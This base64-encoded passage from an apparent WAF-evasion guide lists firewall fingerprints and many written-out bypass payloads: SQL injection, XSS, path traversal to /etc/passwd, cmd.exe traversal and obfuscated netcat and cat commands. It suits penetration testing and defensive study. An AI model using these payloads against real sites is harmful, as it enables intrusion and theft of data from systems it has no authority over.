dGhlIDxjb2RlPnl1bnN1b19zZXNzaW9uPC9jb2RlPiBmaWVsZCBuYW1lLjwv
bGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8L3VsPgog
ICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD4K
ICAgICAgICAgICAgWXhMaW5rCiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+
CiAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRl
Y3RhYmlsaXR5OiA8L2I+RWFzeTwvbGk+CiAgICAgICAgICAgICAgICA8bGk+
PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAg
ICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT5SZXNwb25zZSBt
aWdodCBoYXZlIDxjb2RlPnl4X2NpX3Nlc3Npb248L2NvZGU+IGNvb2tpZSBm
aWVsZC48L2xpPgogICAgICAgICAgICAgICAgICAgIDxsaT5SZXNwb25zZSBt
aWdodCBoYXZlIDxjb2RlPnl4X2xhbmd1YWdlPC9jb2RlPiBjb29raWUgZmll
bGQuPC9saT4KICAgICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+U2VydmVy
PC9jb2RlPiBoZWFkZXIgY29udGFpbnMgPGNvZGU+WXhsaW5rLVdBRjwvY29k
ZT4gZmllbGQgdmFsdWUuPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+CiAg
ICAgICAgICAgIDwvdWw+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CiAgICA8
dHI+CiAgICAgICAgPHRkPgogICAgICAgICAgICBaZW5FZGdlCiAgICAgICAg
PC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAgICAg
ICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+RWFzeTwvbGk+CiAg
ICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5Ojwv
Yj48L2xpPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAg
ICAgIDxsaT5CbG9ja2VkIHJlc3BvbnNlIHBhZ2UgY29udGFpbnMgcmVmZXJl
bmNlIHRvIDxjb2RlPi9fX3plbmVkZ2UvYXNzZXRzLzwvY29kZT4gZGlyZWN0
b3J5LjwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPlNlcnZl
cjwvY29kZT4gaGVhZGVyIGNvbnRhaW4gPGNvZGU+WkVORURHRTwvY29kZT4g
a2V5d29yZC48L2xpPgogICAgICAgICAgICAgICAgICAgIDxsaT5CbG9ja2Vk
IHJlc3BvbnNlIGhlYWRlcnMgbWF5IGNvbnRhaW4gPGNvZGU+WC1aZW4tRnVy
eTwvY29kZT4gaGVhZGVyLjwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgog
ICAgICAgICAgICA8L3VsPgogICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAg
PHRyPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgWlNjYWxlcgogICAgICAg
IDwvdGQ+CiAgICAgICAgPHRkPgogICAgICAgICAgICA8dWw+CiAgICAgICAg
ICAgICAgICA8bGk+PGI+RGV0ZWN0YWJpbGl0eTogPC9iPkVhc3k8L2xpPgog
ICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGlvbiBNZXRob2RvbG9neTo8
L2I+PC9saT4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAg
ICAgICA8bGk+PGNvZGU+U2VydmVyPC9jb2RlPiBoZWFkZXIgaGFzIHZhbHVl
IHNldCB0byA8Y29kZT5aU2NhbGVyPC9jb2RlPi48L2xpPgogICAgICAgICAg
ICAgICAgICAgIDxsaT5CbG9ja2VkIHJlc3BvbnNlIHBhZ2UgY29udGFpbnM6
CiAgICAgICAgICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAg
ICAgICAgICAgICAgIDxsaT48Y29kZT5BY2Nlc3MgRGVuaWVkOiBBY2NlbnR1
cmUgUG9saWN5PC9jb2RlPiB0ZXh0LjwvbGk+CiAgICAgICAgICAgICAgICAg
ICAgICAgICAgICA8bGk+UmVmZXJlbmNlIHRvIDxjb2RlPmh0dHBzOi8vcG9s
aWNpZXMuYWNjZW50dXJlLmNvbTwvY29kZT4gVVJMLjwvbGk+CiAgICAgICAg
ICAgICAgICAgICAgICAgICAgICA8bGk+UmVmZXJlbmNlIHRvIGltYWdlIGF0
IDxjb2RlPmh0dHBzOi8vbG9naW4uenNjbG91ZC5uZXQvaW1nX2xvZ29fbmV3
MS5wbmc8L2NvZGU+LjwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgICAg
ICA8bGk+PGNvZGU+WW91ciBvcmdhbml6YXRpb24gaGFzIHNlbGVjdGVkIFpz
Y2FsZXIgdG8gcHJvdGVjdCB5b3UgZnJvbSBpbnRlcm5ldCB0aHJlYXRzPC9j
b2RlPi48L2xpPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxj
b2RlPlRoZSBJbnRlcm5ldCBzaXRlIHlvdSBoYXZlIGF0dGVtcHRlZCB0byBh
Y2Nlc3MgaXMgcHJvaGliaXRlZC4gQWNjZW50dXJlJ3Mgd2ViZmlsdGVycyBp
bmRpY2F0ZSB0aGF0IHRoZSBzaXRlIGxpa2VseSBjb250YWlucyBjb250ZW50
IGNvbnNpZGVyZWQgaW5hcHByb3ByaWF0ZTwvY29kZT4uPC9saT4KICAgICAg
ICAgICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgICAgICAgICA8
L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPC91bD4K
ICAgICAgICA8L3RkPgogICAgPC90cj4KPC90YWJsZT4KCiMjIEV2YXNpb24g
VGVjaG5pcXVlcwpMZXRzIGxvb2sgYXQgc29tZSBtZXRob2RzIG9mIGJ5cGFz
c2luZyBhbmQgZXZhZGluZyBXQUZzLgoKIyMjIEZ1enppbmcvQnJ1dGVmb3Jj
aW5nOgojIyMjIE1ldGhvZDogIApSdW5uaW5nIGEgc2V0IG9mIHBheWxvYWRz
IGFnYWluc3QgdGhlIFVSTC9lbmRwb2ludC4gU29tZSBuaWNlIGZ1enppbmcg
d29yZGxpc3RzOgotIFdvcmRsaXN0cyBzcGVjaWZpY2FsbHkgZm9yIGZ1enpp
bmcgCiAgICAtIFtTZWNsaXN0cy9GdXp6aW5nXShodHRwczovL2dpdGh1Yi5j
b20vZGFuaWVsbWllc3NsZXIvU2VjTGlzdHMvdHJlZS9tYXN0ZXIvRnV6emlu
ZykuCiAgICAtIFtGdXp6LURCL0F0dGFja10oaHR0cHM6Ly9naXRodWIuY29t
L2Z1enpkYi1wcm9qZWN0L2Z1enpkYi90cmVlL21hc3Rlci9hdHRhY2spCiAg
ICAtIFtPdGhlciBQYXlsb2Fkc10oaHR0cHM6Ly9naXRodWIuY29tL2Zvb3Nw
aWR5L3BheWxvYWRzKQoKIyMjIyBUZWNobmlxdWU6Ci0gTG9hZCB1cCB5b3Vy
IHdvcmRsaXN0IGludG8gZnV6emVyIGFuZCBzdGFydCB0aGUgYnJ1dGVmb3Jj
ZS4KLSBSZWNvcmQvbG9nIGFsbCByZXNwb25zZXMgZnJvbSB0aGUgZGlmZmVy
ZW50IHBheWxvYWRzIGZ1enplZC4KLSBVc2UgcmFuZG9tIHVzZXItYWdlbnRz
LCByYW5naW5nIGZyb20gQ2hyb21lIERlc2t0b3AgdG8gaVBob25lIGJyb3dz
ZXIuCi0gSWYgYmxvY2tpbmcgbm90aWNlZCwgaW5jcmVhc2UgZnV6eiBsYXRl
bmN5IChlZy4gMi00IHNlY3MpLgotIEFsd2F5cyB1c2UgcHJveHljaGFpbnMs
IHNpbmNlIGNoYW5jZXMgYXJlIHJlYWwgdGhhdCB5b3VyIElQIGdldHMgYmxv
Y2tlZC4KCiMjIyMgRHJhd2JhY2tzOgotIFRoaXMgbWV0aG9kIG9mdGVuIGZh
aWxzLiAKLSBNYW55IGEgdGltZXMgeW91ciBJUCB3aWxsIGJlIGJsb2NrZWQg
KHRlbXBvcmFyaWx5L3Blcm1hbmVudGx5KS4KCiMjIyBSZWdleCBSZXZlcnNp
bmc6CiMjIyMgTWV0aG9kOgotIE1vc3QgZWZmaWNpZW50IG1ldGhvZCBvZiBi
eXBhc3NpbmcgV0FGcy4KLSBTb21lIFdBRnMgcmVseSB1cG9uIG1hdGNoaW5n
IHRoZSBhdHRhY2sgcGF5bG9hZHMgd2l0aCB0aGUgc2lnbmF0dXJlcyBpbiB0
aGVpciBkYXRhYmFzZXMuCi0gUGF5bG9hZCBtYXRjaGVzIHRoZSByZWctZXgg
dGhlIFdBRiB0cmlnZ2VycyBhbGFybS4KCiMjIyMgVGVjaG5pcXVlczoKCiMj
IyBCbGFja2xpc3RpbmcgRGV0ZWN0aW9uL0J5cGFzcwoKLSBJbiB0aGlzIG1l
dGhvZCB3ZSB0cnkgdG8gZmluZ2VycHJpbnQgdGhlIHJ1bGVzIHN0ZXAgYnkg
c3RlcCBieSBvYnNlcnZpbmcgdGhlIGtleXdvcmRzIGJlaW5nIGJsYWNrbGlz
dGVkLgotIFRoZSBpZGVhIGlzIHRvIGd1ZXNzIHRoZSByZWdleCBhbmQgY3Jh
ZnQgdGhlIG5leHQgcGF5bG9hZHMgd2hpY2ggZG9lc24ndCB1c2UgdGhlIGJs
YWNrbGlzdGVkIGtleXdvcmRzLgoKX19DYXNlX186IFNRTCBJbmplY3Rpb24K
CiMjIyMjIOKAoiBTdGVwIDE6Cl9fS2V5d29yZHMgRmlsdGVyZWRfXzogYGFu
ZGAsIGBvcmAsIGB1bmlvbmAgIApfX1Byb2JhYmxlIFJlZ2V4X186IGBwcmVn
X21hdGNoKCcvKGFuZHxvcnx1bmlvbikvaScsICRpZClgICAKLSBfX0Jsb2Nr
ZWQgQXR0ZW1wdF9fOiBgdW5pb24gc2VsZWN0IHVzZXIsIHBhc3N3b3JkIGZy
b20gdXNlcnNgCi0gX19CeXBhc3NlZCBJbmplY3Rpb25fXzogYDEgfHwgKHNl
bGVjdCB1c2VyIGZyb20gdXNlcnMgd2hlcmUgdXNlcl9pZCA9IDEpID0gJ2Fk
bWluJ2AKCiMjIyMjIOKAoiBTdGVwIDI6Cl9fS2V5d29yZHMgRmlsdGVyZWRf
XzogYGFuZGAsIGBvcmAsIGB1bmlvbmAsIGB3aGVyZWAgIAotIF9fQmxvY2tl
ZCBBdHRlbXB0X186IGAxIHx8IChzZWxlY3QgdXNlciBmcm9tIHVzZXJzIHdo
ZXJlIHVzZXJfaWQgPSAxKSA9ICdhZG1pbidgCi0gX19CeXBhc3NlZCBJbmpl
Y3Rpb25fXzogYDEgfHwgKHNlbGVjdCB1c2VyIGZyb20gdXNlcnMgbGltaXQg
MSkgPSAnYWRtaW4nYAoKIyMjIyMg4oCiIFN0ZXAgMzoKX19LZXl3b3JkcyBG
aWx0ZXJlZF9fOiBgYW5kYCwgYG9yYCwgYHVuaW9uYCwgYHdoZXJlYCwgYGxp
bWl0YCAgCi0gX19CbG9ja2VkIEF0dGVtcHRfXzogYDEgfHwgKHNlbGVjdCB1
c2VyIGZyb20gdXNlcnMgbGltaXQgMSkgPSAnYWRtaW4nYAotIF9fQnlwYXNz
ZWQgSW5qZWN0aW9uX186IGAxIHx8IChzZWxlY3QgdXNlciBmcm9tIHVzZXJz
IGdyb3VwIGJ5IHVzZXJfaWQgaGF2aW5nIHVzZXJfaWQgPSAxKSA9ICdhZG1p
bidgCgojIyMjIyDigKIgU3RlcCA0OgpfX0tleXdvcmRzIEZpbHRlcmVkX186
IGBhbmRgLCBgb3JgLCBgdW5pb25gLCBgd2hlcmVgLCBgbGltaXRgLCBgZ3Jv
dXAgYnlgICAKLSBfX0Jsb2NrZWQgQXR0ZW1wdF9fOiBgMSB8fCAoc2VsZWN0
IHVzZXIgZnJvbSB1c2VycyBncm91cCBieSB1c2VyX2lkIGhhdmluZyB1c2Vy
X2lkID0gMSkgPSAnYWRtaW4nYAotIF9fQnlwYXNzZWQgSW5qZWN0aW9uX186
IGAxIHx8IChzZWxlY3Qgc3Vic3RyKGdyb3VwX2NvbmNhdCh1c2VyX2lkKSwx
LDEpIHVzZXIgZnJvbSB1c2VycyApID0gMWAKCiMjIyMjIOKAoiBTdGVwIDU6
Cl9fS2V5d29yZHMgRmlsdGVyZWRfXzogYGFuZGAsIGBvcmAsIGB1bmlvbmAs
IGB3aGVyZWAsIGBsaW1pdGAsIGBncm91cCBieWAsIGBzZWxlY3RgICAKLSBf
X0Jsb2NrZWQgQXR0ZW1wdF9fOiBgMSB8fCAoc2VsZWN0IHN1YnN0cihncnVv
cF9jb25jYXQodXNlcl9pZCksMSwxKSB1c2VyIGZyb20gdXNlcnMpID0gMWAK
LSBfX0J5cGFzc2VkIEluamVjdGlvbl9fOiBgMSB8fCAxID0gMSBpbnRvIG91
dGZpbGUgJ3Jlc3VsdC50eHQnYAotIF9fQnlwYXNzZWQgSW5qZWN0aW9uX186
IGAxIHx8IHN1YnN0cih1c2VyLDEsMSkgPSAnYSdgCgojIyMjIyDigKIgU3Rl
cCA2OgpfX0tleXdvcmRzIEZpbHRlcmVkX186IGBhbmRgLCBgb3JgLCBgdW5p
b25gLCBgd2hlcmVgLCBgbGltaXRgLCBgZ3JvdXAgYnlgLCBgc2VsZWN0YCwg
YCdgICAKLSBfX0Jsb2NrZWQgQXR0ZW1wdF9fOiBgMSB8fCAoc2VsZWN0IHN1
YnN0cihncnVvcF9jb25jYXQodXNlcl9pZCksMSwxKSB1c2VyIGZyb20gdXNl
cnMpID0gMWAKLSBfX0J5cGFzc2VkIEluamVjdGlvbl9fOiBgMSB8fCB1c2Vy
X2lkIGlzIG5vdCBudWxsYAotIF9fQnlwYXNzZWQgSW5qZWN0aW9uX186IGAx
IHx8IHN1YnN0cih1c2VyLDEsMSkgPSAweDYxYAotIF9fQnlwYXNzZWQgSW5q
ZWN0aW9uX186IGAxIHx8IHN1YnN0cih1c2VyLDEsMSkgPSB1bmhleCg2MSlg
CgojIyMjIyDigKIgU3RlcCA3OgpfX0tleXdvcmRzIEZpbHRlcmVkX186IGBh
bmRgLCBgb3JgLCBgdW5pb25gLCBgd2hlcmVgLCBgbGltaXRgLCBgZ3JvdXAg
YnlgLCBgc2VsZWN0YCwgYCdgLCBgaGV4YCAgCi0gX19CbG9ja2VkIEF0dGVt
cHRfXzogYDEgfHwgc3Vic3RyKHVzZXIsMSwxKSA9IHVuaGV4KDYxKWAKLSBf
X0J5cGFzc2VkIEluamVjdGlvbl9fOiBgMSB8fCBzdWJzdHIodXNlciwxLDEp
ID0gbG93ZXIoY29udigxMSwxMCwzNikpYAoKIyMjIyMg4oCiIFN0ZXAgODoK
X19LZXl3b3JkcyBGaWx0ZXJlZF9fOiBgYW5kYCwgYG9yYCwgYHVuaW9uYCwg
YHdoZXJlYCwgYGxpbWl0YCwgYGdyb3VwIGJ5YCwgYHNlbGVjdGAsIGAnYCwg
YGhleGAsIGBzdWJzdHJgICAKLSBfX0Jsb2NrZWQgQXR0ZW1wdF9fOiBgMSB8
fCBzdWJzdHIodXNlciwxLDEpID0gbG93ZXIoY29udigxMSwxMCwzNikpYAot
IF9fQnlwYXNzZWQgSW5qZWN0aW9uX186IGAxIHx8IGxwYWQodXNlciw3LDEp
YAoKIyMjIyMg4oCiIFN0ZXAgOToKX19LZXl3b3JkcyBGaWx0ZXJlZF9fOiBg
YW5kYCwgYG9yYCwgYHVuaW9uYCwgYHdoZXJlYCwgYGxpbWl0YCwgYGdyb3Vw
IGJ5YCwgYHNlbGVjdGAsIGAnYCwgYGhleGAsIGBzdWJzdHJgLCBgd2hpdGUg
c3BhY2VgICAKLSBfX0Jsb2NrZWQgQXR0ZW1wdF9fOiBgMSB8fCBscGFkKHVz
ZXIsNywxKWAKLSBfX0J5cGFzc2VkIEluamVjdGlvbl9fOiBgMSUwYnx8JTBi
bHBhZCh1c2VyLDcsMSlgCgojIyMgT2JmdXNjYXRpb246CiMjIyMgTWV0aG9k
OgotIEVuY29kaW5nIHBheWxvYWQgdG8gZGlmZmVyZW50IGVuY29kaW5ncyAo
YSBoaXQgYW5kIHRyaWFsIGFwcHJvYWNoKS4KLSBZb3UgY2FuIGVuY29kZSB3
aG9sZSBwYXlsb2FkLCBvciBzb21lIHBhcnRzIG9mIGl0IGFuZCB0ZXN0IHJl
Y3Vyc2l2ZWx5LgoKIyMjIyBUZWNobmlxdWVzOgpfXzEuIENhc2UgVG9nZ2xp
bmdfXwotIFNvbWUgcG9vcmx5IGRldmVsb3BlZCBXQUZzIGZpbHRlciBzZWxl
Y3RpdmVseSBzcGVjaWZpYyBjYXNlIFdBRnMuCi0gV2UgY2FuIGNvbWJpbmUg
dXBwZXIgYW5kIGxvd2VyIGNhc2UgY2hhcmFjdGVycyBmb3IgZGV2ZWxvcGlu
ZyBlZmZpY2llbnQgcGF5bG9hZHMuCgpfX1N0YW5kYXJkX186IGA8c2NyaXB0
PmFsZXJ0KCk8L3NjcmlwdD5gICAKX19CeXBhc3NlZF9fOiBgPFNjUmlwVD5h
bGVydCgpPC9zQ1JpcFQ+YAoKX19TdGFuZGFyZF9fOiBgU0VMRUNUICogRlJP
TSBhbGxfdGFibGVzIFdIRVJFIE9XTkVSID0gJ0RBVEFCQVNFX05BTUUnYCAg
Cl9fQnlwYXNzZWRfXzogYHNFTGVjVCAqIEZyT20gYWxsX3RhYmxlcyB3aEVS
ZSBPV05FUiA9ICdEQVRBQkFTRV9OQU1FJ2AKCl9fMi4gVVJMIEVuY29kaW5n
X18gIAotIEVuY29kZSBub3JtYWwgcGF5bG9hZHMgd2l0aCAlIGVuY29kaW5n
L1VSTCBlbmNvZGluZy4KLSBDYW4gYmUgZG9uZSB3aXRoIG9ubGluZSB0b29s
cyBsaWtlIFt0aGlzXShodHRwczovL3d3dy51cmwtZW5jb2RlLWRlY29kZS5j
b20vKS4KLSBCdXJwIGluY2x1ZGVzIGEgaW4tYnVpbHQgZW5jb2Rlci9kZWNv
ZGVyLgoKX19CbG9ja2VkX186IGA8c3ZHL3g9Ij4iL29ObG9hRD1jb25maXJt
KCkvL2AgIApfX0J5cGFzc2VkX186IGAlM0NzdkclMkZ4JTNEJTIyJTNFJTIy
JTJGb05sb2FEJTNEY29uZmlybSUyOCUyOSUyRiUyRmAKCl9fQmxvY2tlZF9f
OiBgdU5Jb04oc0VsZUNUIDEsMiwzLDQsNSw2LDcsOCw5LDEwLDExLDEyKWAg
IApfX0J5cGFzc2VkX186IGB1TklvTiUyOHNFbGVDVCsxJTJDMiUyQzMlMkM0
JTJDNSUyQzYlMkM3JTJDOCUyQzklMkMxMCUyQzExJTJDMTIlMjlgCgpfXzMu
IFVuaWNvZGUgTm9ybWFsaXphdGlvbl9fICAKLSBBU0NJSSBjaGFyYWN0ZXJz
IGluIHVuaWNvZGUgZW5jb2RpbmcgZW5jb2RpbmcgcHJvdmlkZSBncmVhdCB2
YXJpYW50cyBmb3IgYnlwYXNzaW5nLgotIFlvdSBjYW4gZW5jb2RlIGVudGly
ZS9wYXJ0IG9mIHRoZSBwYXlsb2FkIGZvciBvYnRhaW5pbmcgcmVzdWx0cy4K
Cl9fU3RhbmRhcmRfXzogYDxtYXJxdWVlIG9uc3RhcnQ9cHJvbXB0KCk+YCAg
Cl9fT2JmdXNjYXRlZF9fOiBgPG1hcnF1ZWUgb25zdGFydD1cdTAwNzByXHUw
NmZcdTAwNmRwdCgpPmAKCl9fQmxvY2tlZF9fOiBgLz9yZWRpcj1odHRwOi8v
Z29vZ2xlLmNvbWAgIApfX0J5cGFzc2VkX186IGAvP3JlZGlyPWh0dHA6Ly9n
b29nbGXjgIJjb21gIChVbmljb2RlIGFsdGVybmF0aXZlKSAKCl9fQmxvY2tl
ZF9fOiBgPG1hcnF1ZWUgbG9vcD0xIG9uZmluaXNoPWFsZXJ0KCk+eGAgIApf
X0J5cGFzc2VkX186IGDvvJxtYXJxdWVlIGxvb3DvvJ0xIG9uZmluaXNo77yd
YWxlcnTvuLUxKT54YCAoVW5pY29kZSBhbHRlcm5hdGl2ZSkKPiBfX1RJUDpf
XyBIYXZlIGEgbG9vayBhdCBbdGhpc10oaHR0cHM6Ly9oYWNrZXJvbmUuY29t
L3JlcG9ydHMvMjMxNDQ0KSBhbmQgW3RoaXNdKGh0dHBzOi8vaGFja2Vyb25l
LmNvbS9yZXBvcnRzLzIzMTM4OSkgcmVwb3J0cyBvbiBIYWNrZXJPbmUuIDop
CgpfX1N0YW5kYXJkX186IGAuLi8uLi9ldGMvcGFzc3dkYCAgCl9fT2JmdXNj
YXRlZF9fOiBgJUMwQUUlQzBBRSVDMEFGJUMwQUUlQzBBRSVDMEFGZXRjJUMw
QUZwYXNzd2RgCgpfXzQuIEhUTUwgUmVwcmVzZW50YXRpb25fXwotIE9mdGVu
IHdlYiBhcHBzIGVuY29kZSBzcGVjaWFsIGNoYXJhY3RlcnMgaW50byBIVE1M
IGVuY29kaW5nIGFuZCByZW5kZXIgdGhlbSBhY2NvcmRpbmdseS4KLSBUaGlz
IGxlYWRzIHVzIHRvIGJhc2ljIGJ5cGFzcyBjYXNlcyB3aXRoIEhUTUwgZW5j
b2RpbmcgKG51bWVyaWMvZ2VuZXJpYykuCgpfX1N0YW5kYXJkX186IGAiPjxp
bWcgc3JjPXggb25lcnJvcj1jb25maXJtKCk+YCAgCl9fRW5jb2RlZF9fOiBg
JnF1b3Q7Jmd0OyZsdDtpbWcgc3JjPXggb25lcnJvcj1jb25maXJtJmxwYXI7
JnJwYXI7Jmd0O2AgKEdlbmVyYWwgZm9ybSkgIApfX0VuY29kZWRfXzogYCYj
MzQ7JiM2MjsmIzYwO2ltZyBzcmM9eCBvbmVycm9yPWNvbmZpcm0mIzQwOyYj
NDE7JiM2MjtgIChOdW1lcmljIHJlZmVyZW5jZSkKCl9fNS4gTWl4ZWQgRW5j
b2RpbmdfXyAgCi0gU29tZXRpbWVzLCBXQUYgcnVsZXMgb2Z0ZW4gdGVuZCB0
byBmaWx0ZXIgb3V0IGEgc3BlY2lmaWMgdHlwZSBvZiBlbmNvZGluZy4KLSBU
aGlzIHR5cGUgb2YgZmlsdGVycyBjYW4gYmUgYnlwYXNzZWQgYnkgbWl4ZWQg
ZW5jb2RpbmcgcGF5bG9hZHMuCi0gVGFicyBhbmQgbmV3bGluZXMgZnVydGhl
ciBhZGQgdG8gb2JmdXNjYXRpb24uCgpfX09iZnVzY2F0ZWRfXzogCmBgYAo8
QSBIUkVGPSJoCnR0ICBwOi8vNiAgIDYuMDAwMTQ2LjB4Ny4xNDcvIj5YU1M8
L0E+CmBgYAoKX182LiBVc2luZyBDb21tZW50c19fCi0gQ29tbWVudHMgb2Jm
dXNjYXRlIHN0YW5kYXJkIHBheWxvYWQgdmVjdG9ycy4gCi0gRGlmZmVyZW50
IHBheWxvYWRzIGhhdmUgZGlmZmVyZW50IHdheXMgb2Ygb2JmdXNjYXRpb24u
CgpfX0Jsb2NrZWRfXzogYDxzY3JpcHQ+YWxlcnQoKTwvc2NyaXB0PmAgIApf
X0J5cGFzc2VkX186IGA8IS0tPjxzY3JpcHQ+YWxlcnQvKiovKCkvKiovPC9z
Y3JpcHQ+YAoKX19CbG9ja2VkX186IGAvP2lkPTErdW5pb24rc2VsZWN0KzEs
MiwzLS1gICAKX19CeXBhc3NlZF9fOiBgLz9pZD0xK3VuLyoqL2lvbitzZWwv
KiovZWN0KzEsMiwzLS1gCgpfXzcuIERvdWJsZSBFbmNvZGluZ19fCi0gT2Z0
ZW4gV0FGIGZpbHRlcnMgdGVuZCB0byBlbmNvZGUgY2hhcmFjdGVycyB0byBw
cmV2ZW50IGF0dGFja3MuCi0gSG93ZXZlciBwb29ybHkgZGV2ZWxvcGVkIGZp
bHRlcnMgKG5vIHJlY3Vyc2lvbiBmaWx0ZXJzKSBjYW4gYmUgYnlwYXNzZWQg
d2l0aCBkb3VibGUgZW5jb2RpbmcuCgpfX1N0YW5kYXJkX186IGBodHRwOi8v
dmljdGltL2NnaS8uLi8uLi93aW5udC9zeXN0ZW0zMi9jbWQuZXhlPy9jK2Rp
citjOlxgICAKX19PYmZ1c2NhdGVkX186IGBodHRwOi8vdmljdGltL2NnaS8l
MjUyRSUyNTJFJTI1MkYlMjUyRSUyNTJFJTI1MkZ3aW5udC9zeXN0ZW0zMi9j
bWQuZXhlPy9jK2RpcitjOlxgCgpfX1N0YW5kYXJkX186IGA8c2NyaXB0PmFs
ZXJ0KCk8L3NjcmlwdD5gICAKX19PYmZ1c2NhdGVkX186IGAlMjUzQ3Njcmlw
dCUyNTNFYWxlcnQoKSUyNTNDJTI1MkZzY3JpcHQlMjUzRWAKCl9fOC4gV2ls
ZGNhcmQgT2JmdXNjYXRpb25fXwotIEdsb2JiaW5nIHBhdHRlcm5zIGFyZSB1
c2VkIGJ5IHZhcmlvdXMgY29tbWFuZC1saW5lIHV0aWxpdGllcyB0byB3b3Jr
IHdpdGggbXVsdGlwbGUgZmlsZXMuCi0gV2UgY2FuIHR3ZWFrIHRoZW0gdG8g
ZXhlY3V0ZSBzeXN0ZW0gY29tbWFuZHMuCi0gU3BlY2lmaWMgdG8gcmVtb3Rl
IGNvZGUgZXhlY3V0aW9uIHZ1bG5lcmFiaWxpdGllcyBvbiBsaW51eCBzeXN0
ZW1zLgoKX19TdGFuZGFyZF9fOiBgL2Jpbi9jYXQgL2V0Yy9wYXNzd2RgICAK
X19PYmZ1c2NhdGVkX186IGAvPz8/Lz8/dCAvPz8/Lz8/c3M/P2AgIApVc2Vk
IGNoYXJzOiBgLyA/IHQgc2AKCl9fU3RhbmRhcmRfXzogYC9iaW4vbmMgMTI3
LjAuMC4xIDEzMzdgICAKX19PYmZ1c2NhdGVkX186IGAvPz8/L24/IDIxMzA3
MDY0MzMgMTMzN2AgIApVc2VkIGNoYXJzOiBgLyA/IG4gWzAtOV1gCgpfXzku
IER5bmFtaWMgUGF5bG9hZCBHZW5lcmF0aW9uX18KLSBEaWZmZXJlbnQgcHJv
Z3JhbW1pbmcgbGFuZ3VhZ2VzIGhhdmUgZGlmZmVyZW50IHN5bnRheGVzIGFu
ZCBwYXR0ZXJucyBmb3IgY29uY2F0ZW5hdGlvbi4KLSBUaGlzIGFsbG93cyB1
cyB0byBlZmZlY3RpdmVseSBnZW5lcmF0ZSBwYXlsb2FkcyB0aGF0IGNhbiBi
eXBhc3MgbWFueSBmaWx0ZXJzIGFuZCBydWxlcy4KCl9fU3RhbmRhcmRfXzog
YDxzY3JpcHQ+YWxlcnQoKTwvc2NyaXB0PmAgIApfX09iZnVzY2F0ZWRfXzog
YDxzY3JpcHQ+ZXZhbCgnYWwnKydlcicrJ3QoKScpPC9zY3JpcHQ+YAoKX19T
dGFuZGFyZF9fOiBgL2Jpbi9jYXQgL2V0Yy9wYXNzd2RgICAKX19PYmZ1c2Nh
dGVkX186IGAvYmknbicnJy9jJydhdCcgL2UndGMnL3BhJydzcyd3ZGAKPiBC
YXNoIGFsbG93cyBwYXRoIGNvbmNhdGVuYXRpb24gZm9yIGV4ZWN1dGlvbi4K
Cl9fU3RhbmRhcmRfXzogYDxpZnJhbWUvb25sb2FkPSd0aGlzWyJzcmMiXT0i
amF2YXNjcmlwdDphbGVydCgpIic7PmAgIApfX09iZnVzY2F0ZWRfXzogYDxp
ZnJhbWUvb25sb2FkPSd0aGlzWyJzcmMiXT0iamF2IisiYXMmVGFiO2NyIisi
aXB0OmFsIisiZXIiKyJ0KCkiJzs+YAoKX185LiBKdW5rIENoYXJhY3RlcnNf
XwotIE5vcm1hbCBwYXlsb2FkcyBnZXQgZmlsdGVyZWQgb3V0IGVhc2lseS4K
LSBBZGRpbmcgc29tZSBqdW5rIGNoYXJzIGhlbHBzIGF2b2lkIGRldGVjdGlv
biAoc3BlY2lmaWMgY2FzZXMgb25seSkuCi0gVGhleSBvZnRlbiBoZWxwIGlu
IGNvbmZ1c2luZyByZWdleCBiYXNlZCBmaXJld2FsbHMuCgpfX1N0YW5kYXJk
X186IGA8c2NyaXB0PmFsZXJ0KCk8L3NjcmlwdD5gICAKX19PYmZ1c2NhdGVk
X186IGA8c2NyaXB0PistKy0xLSstK2FsZXJ0KDEpPC9zY3JpcHQ+YAoKX19T
dGFuZGFyZF9fOiBgPEJPRFkgb25sb2FkPWFsZXJ0KCk+YCAgCl9fT2JmdXNj
YXRlZF9fOiBgYGA8Qk9EWSBvbmxvYWQhIyQlJigpKn4rLV8uLDo7P0BbL3xc
XV5gPWFsZXJ0KCk+YGBgCj4gX19OT1RFOl9fIFRoZSBhYm92ZSBwYXlsb2Fk
IGNhbiBicmVhayB0aGUgcmVnZXggcGFyc2VyIHRvIGNhdXNlIGFuIGV4Y2Vw
dGlvbi4KCl9fU3RhbmRhcmRfXzogYDxhIGhyZWY9amF2YXNjcmlwdDthbGVy
dCgpPkNsaWNrTWUgYCAgCl9fQnlwYXNzZWRfXzogYDxhIGFhIGFhYSBhYWFh
IGFhYWFhIGFhYWFhYSBhYWFhYWFhIGFhYWFhYWFhIGFhYWFhYWFhYWEgaHJl
Zj1qJiM5N3YmIzk3c2NyaXB0JiN4M0E7JiM5N2xlcnQoMSk+Q2xpY2tNZWAK
Cl9fMTAuIExpbmUgQnJlYWtzX18KLSBNYW55IFdBRiB3aXRoIHJlZ2V4IGJh
c2VkIGZpbHRlcmluZyBlZmZlY3RpdmVseSBibG9ja3MgbWFueSBhdHRlbXB0
